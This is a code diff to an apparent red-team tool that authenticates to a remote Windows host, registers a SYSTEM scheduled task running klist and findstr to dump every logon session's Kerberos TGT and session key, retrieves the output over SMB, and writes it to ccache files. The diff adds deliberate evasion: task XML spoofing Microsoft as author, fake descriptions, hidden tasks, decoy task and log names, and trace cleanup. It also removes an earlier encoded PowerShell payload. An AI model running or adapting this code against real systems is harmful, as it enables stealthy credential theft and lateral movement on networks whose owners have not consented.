@@ -7,10 +7,20 @@ TGT to a MIT ccache file.  Requires the Tsch binary (Titanis PR #18 /
 release containing ms-tsch support).
 
 Remote execution chain:
-  Tsch create/run  →  klist.exe via cmd.exe (SYSTEM context)
-  Smb2Client get   →  read C$\\ProgramData\\<rand>.txt
+  Smb2Client       →  (no files staged before task creation)
+  Tsch create/run  →  cmd.exe → klist.exe + findstr.exe (SYSTEM context)
+  Smb2Client get   →  read C$\\ProgramData\\<decoy>.log
   Smb2Client rm    →  delete temp file
   Tsch delete      →  remove scheduled task
+
+OPSEC notes:
+  - No PowerShell.  The remote payload is cmd.exe calling klist.exe and
+    findstr.exe — both Microsoft-signed Windows binaries.
+  - Task XML is registered with Author=Microsoft Corporation, a plausible
+    Description, Hidden=true, and a path under \\Microsoft\\Windows\\.
+  - Output file uses a software-component name + hex nonce with .log ext.
+  - No LSASS reads.  klist.exe calls LsaCallAuthenticationPackage
+    internally; titan only collects the text output over SMB.
 
 Session key note:
   The task runs as NT AUTHORITY\\SYSTEM so klist returns the real
@@ -38,7 +48,6 @@ Usage:
 """
 
 import argparse
-import base64
 import os
 import re
 import struct
@@ -47,36 +56,50 @@ import tempfile
 import time
 import random
 from datetime import datetime, timezone
+from xml.sax.saxutils import escape as _xml_escape
 
 from titanlib.common import auth_args, add_auth_args, apply_target_string, validate_auth, run as _run, find_binary, make_env
 
-TSCH_BIN    = find_binary('Tsch')
-SMB_BIN     = find_binary('Smb2Client')
+TSCH_BIN = find_binary('Tsch')
+SMB_BIN  = find_binary('Smb2Client')
 
-_WORDS_A = [
-    "amber","azure","black","blank","blaze","blown","brave","brief","broad",
-    "brown","brisk","burly","clean","clear","close","cloud","coral","crisp",
-    "cross","crown","cubic","curly","dated","dense","digit","dizzy","drawn",
-    "dried","dryer","dusty","eager","early","eight","elite","empty","equal",
-    "exact","faint","fancy","fifth","final","fixed","flame","flint","floss",
-    "fluid","focal","forte","found","freed","fresh","front","froze","fuzzy",
-    "giant","given","glass","globe","gloss","grand","grant","grasp","gravel",
-    "great","green","greet","grind","grown","guard","gusto","handy","harsh",
+# ── decoy name generation ─────────────────────────────────────────────────────
+
+_TASK_FOLDERS = [
+    r'\Microsoft\Windows\WS',
+    r'\Microsoft\Windows\WDI',
+    r'\Microsoft\Windows\Shell',
+    r'\Microsoft\Windows\MUI',
+    r'\Microsoft\Windows\DiskDiagnostic',
 ]
-_WORDS_B = [
-    "agent","alarm","album","algae","alpha","amber","angel","angle","anvil",
-    "apple","arena","arrow","atlas","attic","audit","badge","basin","batch",
-    "blade","bland","blast","blend","bliss","bloom","board","bonus","booth",
-    "brace","brand","brass","brine","brush","build","built","bulge","bully",
-    "cable","cache","cargo","cedar","chain","charm","chest","chief","chord",
-    "civic","clamp","cleft","clerk","cliff","cloak","clone","cloth","clout",
-    "coast","cobra","codec","comet","coral","corps","count","cover","craft",
-    "crane","creek","crest","drift","drone","drove","dwarf","eagle","easel",
+_TASK_VERBS = [
+    'BrokerSync', 'CacheRefresh', 'DataCollect', 'EventLogSvc',
+    'FeedUpdate',  'GatherInfo',  'HealthCheck',  'IndexSync',
+    'JobDispatch', 'KeyRotate',   'LicenseCheck', 'MetaSync',
+]
+_FILE_PREFIXES = [
+    'WUSvc', 'MsiTrace', 'DiagLog', 'PerfMon',
+    'EventLog', 'NetTrace', 'AppLog', 'TelLog',
+]
+_TASK_DESCRIPTIONS = [
+    'Manages Windows Modules Installer Worker operations on this device.',
+    'Monitors and tracks system diagnostic data for Windows maintenance.',
+    'Updates service cache data for improved system performance.',
+    'Collects diagnostic information to improve Windows reliability.',
 ]
 
 
-def _rname() -> str:
-    return random.choice(_WORDS_A) + random.choice(_WORDS_B)
+def _make_decoy() -> tuple:
+    """Return (task_path, out_filename, sessions_filename) for one run."""
+    n      = random.randint(0x1000, 0xEFFF)
+    folder = random.choice(_TASK_FOLDERS)
+    verb   = random.choice(_TASK_VERBS)
+    prefix = random.choice(_FILE_PREFIXES)
+    return (
+        f'{folder}\\{verb}_{n:04x}',
+        f'{prefix}_{n:04x}.log',
+        f'{prefix}_{n:04x}_s.log',
+    )
 
 
 # ── ccache reader (key extraction from reference file) ────────────────────────
@@ -246,20 +269,73 @@ def write_ccache(info: dict, path: str) -> None:
 # ── remote execution helpers ──────────────────────────────────────────────────
 
 def _tsch_auth(args) -> list:
-    """Build standard Titanis auth flags for Tsch/Smb2Client."""
     return auth_args(args)
 
 
-def _tsch_create(tsch_bin, task_path, command, arguments, target, auth_flags, verbose) -> bool:
-    # ServerName is a positional arg — must be last in the extra list.
-    extra = [
-        '-TaskPath',  task_path,
-        '-Command',   command,
-        '-Arguments', arguments,
-        '-RunAs',     'System',
-        target,
-    ]
-    stdout, rc = _run(tsch_bin, 'create', auth_flags, extra, verbose=verbose)
+def _build_cmd_args(remote_out: str, remote_sessions: str) -> str:
+    """Pure cmd.exe payload — no PowerShell, no base64.
+
+    Runs klist.exe and findstr.exe (both Microsoft-signed) to enumerate
+    all logon session LUIDs and dump each TGT into the output file.
+    The sessions staging file is deleted by cmd.exe after the loop.
+    """
+    return (
+        f'/c klist sessions > "{remote_sessions}" 2>&1'
+        f' & for /f "tokens=2 delims=:" %i in'
+        f' (\'findstr "0:0x" "{remote_sessions}"\') do'
+        f' (echo === SESSION %i === >> "{remote_out}"'
+        f'  & klist tgt -li %i >> "{remote_out}" 2>&1)'
+        f' & del "{remote_sessions}" 2>nul'
+    )
+
+
+def _build_task_xml(arguments: str) -> bytes:
+    """Task XML with spoofed Author/Description and Hidden=true.
+    Returns UTF-16-LE bytes with BOM — required by Windows Task Scheduler."""
+    desc = random.choice(_TASK_DESCRIPTIONS)
+    body = (
+        '<?xml version="1.0" encoding="UTF-16"?>\n'
+        '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
+        '  <RegistrationInfo>\n'
+        '    <Author>Microsoft Corporation</Author>\n'
+        f'    <Description>{desc}</Description>\n'
+        '  </RegistrationInfo>\n'
+        '  <Settings>\n'
+        '    <Hidden>true</Hidden>\n'
+        '    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n'
+        '    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n'
+        '    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n'
+        '    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>\n'
+        '    <Priority>7</Priority>\n'
+        '  </Settings>\n'
+        '  <Triggers/>\n'
+        '  <Principals>\n'
+        '    <Principal id="Author">\n'
+        '      <UserId>S-1-5-18</UserId>\n'
+        '      <RunLevel>HighestAvailable</RunLevel>\n'
+        '    </Principal>\n'
+        '  </Principals>\n'
+        '  <Actions Context="Author">\n'
+        '    <Exec>\n'
+        '      <Command>cmd.exe</Command>\n'
+        f'      <Arguments>{_xml_escape(arguments)}</Arguments>\n'
+        '    </Exec>\n'
+        '  </Actions>\n'
+        '</Task>'
+    )
+    return b'\xff\xfe' + body.encode('utf-16-le')
+
+
+def _tsch_create(tsch_bin, task_path, arguments, target, auth_flags, verbose) -> bool:
+    xml_bytes = _build_task_xml(arguments)
+    with tempfile.NamedTemporaryFile(suffix='.xml', mode='wb', delete=False) as f:
+        f.write(xml_bytes)
+        xml_path = f.name
+    try:
+        extra = ['-TaskPath', task_path, '-X', xml_path, target]
+        stdout, rc = _run(tsch_bin, 'create', auth_flags, extra, verbose=verbose)
+    finally:
+        os.unlink(xml_path)
     if rc != 0:
         print(f'  [!] Tsch create failed (rc={rc})', file=sys.stderr)
         if stdout: print(f'  [!] {stdout.strip()}', file=sys.stderr)
@@ -283,7 +359,6 @@ def _tsch_delete(tsch_bin, task_path, target, auth_flags, verbose):
 
 
 def _smb_get(smb_bin, unc_path, dest_path, auth_flags, verbose) -> bool:
-    # UncPath and DestinationFileName are positional in Smb2Client get.
     extra = [unc_path, dest_path, '-Overwrite']
     stdout, rc = _run(smb_bin, 'get', auth_flags, extra, verbose=verbose)
     if rc != 0:
@@ -293,47 +368,14 @@ def _smb_get(smb_bin, unc_path, dest_path, auth_flags, verbose) -> bool:
 
 
 def _smb_rm(smb_bin, unc_path, auth_flags, verbose):
-    # UncPath is positional in Smb2Client rm.
     _run(smb_bin, 'rm', auth_flags, [unc_path], verbose=verbose)
-
-
-# ── PowerShell payload ────────────────────────────────────────────────────────
-
-def _build_payload(remote_out: str) -> tuple:
-    """
-    Returns (command, arguments) for Tsch create.
-
-    The PowerShell script:
-      1. Runs klist sessions, extracts each LUID (0xNNN from 'Logon Session X:0xNNN')
-      2. For each LUID prints a === SESSION 0xNNN === separator then klist tgt -li 0xNNN
-      3. Redirects all output to the temp file via cmd.exe
-
-    Running as SYSTEM means klist returns the real KerberosKeyWithMetadata blob
-    (containing the cleartext session key for non-CG hosts).
-    """
-    ps = (
-        "$luid = (klist sessions | Select-String '\\[\\d+\\]\\s+Session\\s+\\d+\\s+0:(0x[0-9a-fA-F]+)') "
-        "| ForEach-Object { $_.Matches[0].Groups[1].Value } | Sort-Object -Unique; "
-        "foreach ($id in $luid) { "
-        "  Write-Output ('=== SESSION ' + $id + ' ==='); "
-        "  klist tgt -li $id "
-        "}"
-    )
-    ps_b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
-    cmd  = 'cmd.exe'
-    args = f'/c powershell -NoProfile -NonInteractive -EncodedCommand {ps_b64} > "{remote_out}" 2>&1'
-    return cmd, args
 
 
 # ── session output splitter ───────────────────────────────────────────────────
 
 def _split_sessions(text: str) -> list:
-    """
-    Split combined klist output (multiple === SESSION 0xNNN === blocks)
-    into [(luid, block_text), ...].
-    """
+    """Split combined klist output into [(luid, block_text), ...]."""
     parts = re.split(r'=== SESSION (0x[0-9a-fA-F]+) ===', text, flags=re.IGNORECASE)
-    # parts: [pre, luid1, block1, luid2, block2, ...]
     sessions = []
     for i in range(1, len(parts) - 1, 2):
         luid  = parts[i].strip().lower()
@@ -357,29 +399,29 @@ def _dump(args, tsch_bin, smb_bin) -> int:
         print('[!] Smb2Client binary not found — run install.sh', file=sys.stderr)
         return 1
 
-    target    = args.target
-    out_dir   = args.output or '.'
-    verbose   = args.verbose
+    target  = args.target
+    out_dir = args.output or '.'
+    verbose = args.verbose
     os.makedirs(out_dir, exist_ok=True)
 
-    rand      = _rname()
-    task_name = f'\\{rand}'
-    file_name = f'{rand}.txt'
-    remote_out = f'C:\\ProgramData\\{file_name}'
-    unc_path   = f'\\\\{target}\\C$\\ProgramData\\{file_name}'
+    task_name, file_name, sessions_name = _make_decoy()
+    remote_out      = f'C:\\ProgramData\\{file_name}'
+    remote_sessions = f'C:\\ProgramData\\{sessions_name}'
+    unc_out         = f'\\\\{target}\\C$\\ProgramData\\{file_name}'
+    unc_sessions    = f'\\\\{target}\\C$\\ProgramData\\{sessions_name}'
 
     smb_auth  = _tsch_auth(args)
     tsch_auth = smb_auth + ['-PreferSmb', '-EncryptRpc']
-    cmd, arguments = _build_payload(remote_out)
+    arguments = _build_cmd_args(remote_out, remote_sessions)
 
     print(f'[*] Target     : {target}')
-    print(f'[*] Task name  : {task_name}')
-    print(f'[*] Temp file  : {remote_out}')
+    print(f'[*] Task path  : {task_name}')
+    print(f'[*] Output     : {remote_out}')
     print()
 
     # ── create & run task ─────────────────────────────────────────────────────
     print('[*] Creating scheduled task ...')
-    if not _tsch_create(tsch_bin, task_name, cmd, arguments, target, tsch_auth, verbose):
+    if not _tsch_create(tsch_bin, task_name, arguments, target, tsch_auth, verbose):
         return 1
 
     print('[*] Triggering task ...')
@@ -387,24 +429,30 @@ def _dump(args, tsch_bin, smb_bin) -> int:
         _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
         return 1
 
-    # ── wait for task completion, then read output file ───────────────────────
-    with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as tmp:
+    # ── poll for output file (deadline-based) ─────────────────────────────────
+    with tempfile.NamedTemporaryFile(suffix='.log', delete=False) as tmp:
         local_tmp = tmp.name
 
-    print('[*] Waiting for task and retrieving output ...')
-    ok = False
-    for attempt in range(1, 7):
-        time.sleep(5)
+    print('[*] Waiting for task output ...')
+    ok       = False
+    deadline = time.time() + 45
+    time.sleep(2)
+    attempt  = 0
+    while time.time() < deadline:
+        attempt += 1
         if verbose:
-            print(f'  [*] SMB read attempt {attempt}/6 ...', file=sys.stderr)
-        if _smb_get(smb_bin, unc_path, local_tmp, smb_auth, verbose):
+            print(f'  [*] SMB read attempt {attempt} ...', file=sys.stderr)
+        if _smb_get(smb_bin, unc_out, local_tmp, smb_auth, verbose):
             ok = True
             break
+        time.sleep(3)
 
     # ── cleanup (best-effort) ─────────────────────────────────────────────────
     print('[*] Cleaning up ...')
     if ok:
-        _smb_rm(smb_bin, unc_path, smb_auth, verbose)
+        _smb_rm(smb_bin, unc_out, smb_auth, verbose)
+    # sessions file is deleted by cmd.exe; this catches the rare case it wasn't
+    _smb_rm(smb_bin, unc_sessions, smb_auth, verbose)
     _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
 
     if not ok:
@@ -422,7 +470,6 @@ def _dump(args, tsch_bin, smb_bin) -> int:
 
     sessions = _split_sessions(raw)
     if not sessions:
-        # Single session / no separator — treat whole output as one block
         sessions = [('unknown', raw)]
 
     print(f'\n[*] Found {len(sessions)} logon session(s)\n')
